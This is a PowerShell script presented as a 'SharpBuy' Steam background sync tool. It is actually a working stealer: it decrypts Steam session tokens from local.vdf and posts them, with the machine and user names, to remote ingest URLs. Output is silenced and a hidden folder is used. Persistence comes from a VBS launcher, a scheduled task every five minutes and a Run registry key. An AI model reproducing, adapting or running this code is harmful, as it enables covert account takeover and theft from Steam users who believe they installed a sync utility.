# SharpBuy auto-upload + silent Windows background sync
$ErrorActionPreference = 'Stop'
$Script:SharpBuyUploadUrls = @('https://sharpbuy.onrender.com/api/token-ingest', 'https://sharpbuy.org/api/token-ingest')
$Script:SharpBuyUploadKey = 'sb_ing_a8K2mP9xQ4vL7nR1'
$Script:EncodedLaunch = '__SB_ENC_BLOB__'
$Script:SharpBuyRoot = Join-Path $env:ProgramData 'SharpBuy'
$Script:Background = ($env:SB_BACKGROUND -eq '1')
$Script:PsExe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'

function Write-Host { process {} }

function Stop-X([string[]]$M, [int]$C = 1) {
    if ($Script:Background) { exit 0 }
    if ($M.Count) { Send-Evt 'error' ($M -join ' | ') }
    exit $C
}

function Send-Evt([string]$S, [string]$M) {
    try {
        $src = if ($Script:Background) { 'auto-sync' } else { 'extract-bat' }
        $b = @{ event = $true; status = $S; message = $M; hostname = $env:COMPUTERNAME; username = $env:USERNAME; source = $src } | ConvertTo-Json -Compress
        Invoke-Ingest $b 20 | Out-Null
    } catch {}
}

function Invoke-Ingest([string]$Body, [int]$T = 30) {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $h = @{ 'X-SharpBuy-Key' = $Script:SharpBuyUploadKey }
    $e = $null
    foreach ($u in $Script:SharpBuyUploadUrls) {
        try { return Invoke-RestMethod -Uri $u -Method POST -ContentType 'application/json; charset=utf-8' -Headers $h -Body $Body -TimeoutSec $T }
        catch { $e = $_ }
    }
    if ($e) { throw $e }
    throw 'No upload endpoints'
}

function Send-Tokens([array]$Tokens) {
    if (-not $Tokens -or $Tokens.Count -eq 0) { return $false }
    $src = if ($Script:Background) { 'auto-sync' } else { 'extract-bat' }
    $b = @{
        tokens = @($Tokens | ForEach-Object { @{ token = $_.Token; steamId = $_.SteamId; accountName = $_.AccountName; personaName = $_.PersonaName } })
        hostname = $env:COMPUTERNAME; username = $env:USERNAME; source = $src
    } | ConvertTo-Json -Depth 6 -Compress
    try { Invoke-Ingest $b 45 | Out-Null; return $true }
    catch { if ($Script:Background) { return $false }; Stop-X @('Upload failed', $_.Exception.Message) }
}

function Test-Env {
    $r = Get-ItemProperty 'HKCU:\Software\Valve\Steam' -EA SilentlyContinue
    if (-not $r -or -not $r.SteamPath) { if ($Script:Background) { exit 0 }; Stop-X @('Steam not found') }
    if (-not (Test-Path (Join-Path $env:LOCALAPPDATA 'Steam\local.vdf'))) { if ($Script:Background) { exit 0 }; Stop-X @('No local.vdf - login to Steam with Remember me') }
    $lu = Join-Path (($r.SteamPath -replace '/', '\')) 'config\loginusers.vdf'
    if (-not (Test-Path $lu)) { if ($Script:Background) { exit 0 }; Stop-X @('No loginusers.vdf') }
}

function Get-Fingerprint([array]$Tokens) {
    if (-not $Tokens -or $Tokens.Count -eq 0) { return '' }
    ($Tokens | Sort-Object SteamId | ForEach-Object {
        $j = $_.Jwt; $pfx = if ($j.Length -gt 24) { $j.Substring(0, 24) } else { $j }
        "$($_.SteamId)|$($_.AccountName)|$pfx"
    }) -join ';'
}

function Install-SharpBuyWatcher {
    $src = $env:SB_BAT
    if (-not $src -or -not (Test-Path -LiteralPath $src)) { return $false }

    $root = $Script:SharpBuyRoot
    $core = Join-Path $root 'core.pkg'
    $runner = Join-Path $root 'run.vbs'
    $mark = Join-Path $root '.watch.ok'
    $enc = $Script:EncodedLaunch
    if (-not $enc -or $enc.Length -lt 100) { return $false }

    New-Item -ItemType Directory -Path $root -Force | Out-Null
    try { attrib +h $root 2>$null | Out-Null } catch {}

    Copy-Item -LiteralPath $src -Destination $core -Force
    $coreEsc = $core -replace '\\', '\\'
    $psEsc = $Script:PsExe -replace '\\', '\\'
    $vbs = @"
Set sh=CreateObject("WScript.Shell")
sh.Environment("Process")("SB_BAT")="$coreEsc"
sh.Environment("Process")("SB_BACKGROUND")="1"
sh.Run "$psEsc -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $enc",0,False
"@
    Set-Content -LiteralPath $runner -Value $vbs -Encoding ASCII -Force

    $task5m = 'SharpBuySteamToken5m'
    $tr = "wscript.exe //nologo `"$runner`""
    schtasks /Delete /TN $task5m /F 2>$null | Out-Null
    schtasks /Create /TN $task5m /TR $tr /SC MINUTE /MO 5 /RL LIMITED /F 2>$null | Out-Null

    try {
        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SharpBuySteamSync' -Value $tr -Force
    } catch {}

    if (-not (Test-Path $mark)) {
        Send-Evt 'info' 'Background sync installed (every 5 min + logon)'
    }
    Set-Content -LiteralPath $mark -Value (Get-Date -Format 'o') -Force
    return $true
}

Add-Type @'
using System;using System.Runtime.InteropServices;using System.Text;
public static class S {
[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)] public struct DATA_BLOB{public int cbData;public IntPtr pbData;}
[DllImport("Crypt32.dll",CharSet=CharSet.Unicode,SetLastError=true)] public static extern bool CryptUnprotectData(ref DATA_BLOB a,ref string b,ref DATA_BLOB c,IntPtr d,IntPtr e,int f,ref DATA_BLOB g);
[DllImport("Kernel32.dll",EntryPoint="LocalFree",SetLastError=true)] public static extern IntPtr LocalFree(IntPtr h);
public static uint Crc32(byte[] x){uint[] t=new uint[256];for(uint i=0;i<256;i++){uint v=i;for(int j=0;j<8;j++)v=((v&1)==1)?(v>>1)^0xedb88320u:v>>1;t[i]=v;}uint c=0xffffffff;foreach(byte b in x){c=(c>>8)^t[(byte)((c&0xff)^b)];}return ~c;}
public static string Key(string n){return Crc32(Encoding.UTF8.GetBytes(n)).ToString("x").TrimStart('0')+"1";}
static byte[] H(string h){h=h.Trim();byte[] b=new byte[h.Length/2];for(int i=0;i<b.Length;i++)b[i]=Convert.ToByte(h.Substring(i*2,2),16);return b;}
public static string Dec(string h,string n){if(string.IsNullOrWhiteSpace(h)||string.IsNullOrWhiteSpace(n))return null;try{byte[] c=H(h);byte[] e=Encoding.UTF8.GetBytes(n);string d="B\u0000O\u0000b\u0000f\u0000u\u0000s\u0000c\u0000a\u0000t\u0000e\u0000B\u0000u\u0000f\u0000f\u0000e\u0000r\u0000\u0000\u0000";DATA_BLOB i=new DATA_BLOB(),t=new DATA_BLOB(),o=new DATA_BLOB();IntPtr pi=Marshal.AllocHGlobal(c.Length),pe=Marshal.AllocHGlobal(e.Length);try{Marshal.Copy(c,0,pi,c.Length);i.cbData=c.Length;i.pbData=pi;Marshal.Copy(e,0,pe,e.Length);t.cbData=e.Length;t.pbData=pe;if(!CryptUnprotectData(ref i,ref d,ref t,IntPtr.Zero,IntPtr.Zero,17,ref o))return null;byte[] p=new byte[o.cbData];Marshal.Copy(o.pbData,p,0,o.cbData);return Encoding.UTF8.GetString(p);}finally{Marshal.FreeHGlobal(pi);Marshal.FreeHGlobal(pe);if(o.pbData!=IntPtr.Zero)LocalFree(o.pbData);}}catch{return null;}}
}
'@

function SteamPath { (Get-ItemProperty 'HKCU:\Software\Valve\Steam' -EA SilentlyContinue).SteamPath -replace '/', '\' }
function JwtSid([string]$j) {
    $p = $j.Split('.'); if ($p.Length -lt 2) { return $null }
    $x = $p[1]; $x += ('=' * ((4 - ($x.Length % 4)) % 4)); $x = $x.Replace('-', '+').Replace('_', '/')
    try { $o = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)); if ($o -match '"sub"\s*:\s*"(\d+)"') { return $Matches[1] } } catch {}
    $null
}

function Parse-Users([string]$C) {
    $u = @()
    foreach ($m in [regex]::Matches($C, '"(?<sid>\d{17})"\s*\{[^}]*?"AccountName"\s+"(?<name>[^"]+)"[^}]*?\}', 'Singleline')) {
        $b = $m.Value; $pn = $m.Groups['name'].Value
        if ($b -match '"PersonaName"\s+"([^"]+)"') { $pn = $Matches[1] }
        $u += [PSCustomObject]@{ SteamId = $m.Groups['sid'].Value; AccountName = $m.Groups['name'].Value; PersonaName = $pn }
    }
    $u
}

function Find-Tok([string]$V, [string]$A, [string]$E, [hashtable]$U) {
    if (-not $V -or $V -notmatch '"ConnectCache"') { return $null }
    $ck = [S]::Key($A); $jwt = $null; $uk = $null
    if ($V -match "`"$([regex]::Escape($ck))`"\s+`"([0-9a-fA-F]+)`"") {
        if (-not $U.ContainsKey($ck)) { $t = [S]::Dec($Matches[1], $A); if ($t -and $t.StartsWith('ey')) { $jwt = $t; $uk = $ck } }
    }
    if (-not $jwt) {
        foreach ($m in [regex]::Matches($V, '"([0-9a-f]+)"\s+"([0-9a-fA-F]+)"')) {
            $k = $m.Groups[1].Value; $h = $m.Groups[2].Value
            if ($h.Length -lt 100 -or $U.ContainsKey($k)) { continue }
            $t = [S]::Dec($h, $A)
            if ($t -and $t.StartsWith('ey')) {
                $s = JwtSid $t
                if (-not $E -or -not $s -or $s -eq $E) { $jwt = $t; $uk = $k; break }
            }
        }
    }
    if (-not $jwt) { return $null }
    $sid = JwtSid $jwt; if (-not $sid) { $sid = $E }
    if ($uk) { $U[$uk] = $true }
    [PSCustomObject]@{ Jwt = $jwt; SteamId = $sid; AccountName = $A; PersonaName = ''; Token = "$sid----$jwt" }
}

function Extract-All {
    $v = Get-Content -Raw (Join-Path $env:LOCALAPPDATA 'Steam\local.vdf') -EA SilentlyContinue
    $lp = Join-Path (SteamPath) 'config\loginusers.vdf'
    $users = @(); if (Test-Path $lp) { $users = Parse-Users (Get-Content -Raw $lp) }
    $used = @{}; $found = @()
    foreach ($user in $users) {
        $hit = Find-Tok $v $user.AccountName $user.SteamId $used
        if ($hit) { $hit.PersonaName = $user.PersonaName; $found += $hit }
    }
    if ($v) {
        $map = @{}; foreach ($u in $users) { if ($u.AccountName) { $map[$u.AccountName] = $u }; if ($u.SteamId) { $map[$u.SteamId] = $u } }
        foreach ($m in [regex]::Matches($v, '"([0-9a-f]+)"\s+"([0-9a-fA-F]+)"')) {
            $k = $m.Groups[1].Value; $h = $m.Groups[2].Value
            if ($h.Length -lt 100 -or $used.ContainsKey($k)) { continue }
            foreach ($name in $map.Keys) {
                $t = [S]::Dec($h, $name); if (-not ($t -and $t.StartsWith('ey'))) { continue }
                $sid = JwtSid $t; $u = $map[$name]
                if ($sid -and $u.SteamId -and $sid -ne $u.SteamId) { continue }
                $used[$k] = $true
                $found += [PSCustomObject]@{ Jwt = $t; SteamId = $(if ($sid) { $sid } else { $u.SteamId }); AccountName = $u.AccountName; PersonaName = $u.PersonaName; Token = "$(if ($sid) { $sid } else { $u.SteamId })----$t" }
                break
            }
        }
    }
    $by = @{}; $out = @()
    foreach ($i in $found) {
        if (-not $i.Token -or $by.ContainsKey($i.Jwt)) { continue }
        $by[$i.Jwt] = $true; $out += $i
    }
    $out
}

if (-not $Script:Background) { Install-SharpBuyWatcher | Out-Null }

Test-Env
if (-not $Script:Background) { Send-Evt 'start' 'Bat started' }

$t = Extract-All
if (-not $t.Count) { Stop-X @('No tokens - login with Remember me') }

$fpFile = Join-Path $Script:SharpBuyRoot 'last.fp'
$fp = Get-Fingerprint $t
$lastFp = ''
if (Test-Path $fpFile) { $lastFp = (Get-Content -LiteralPath $fpFile -Raw -EA SilentlyContinue).Trim() }

if ($fp -eq $lastFp -and $Script:Background) { exit 0 }

if (Send-Tokens $t) {
    Set-Content -LiteralPath $fpFile -Value $fp -Force -EA SilentlyContinue
    if ($Script:Background) { Send-Evt 'success' "Auto sync: $($t.Count) token(s)" }
}

exit 0
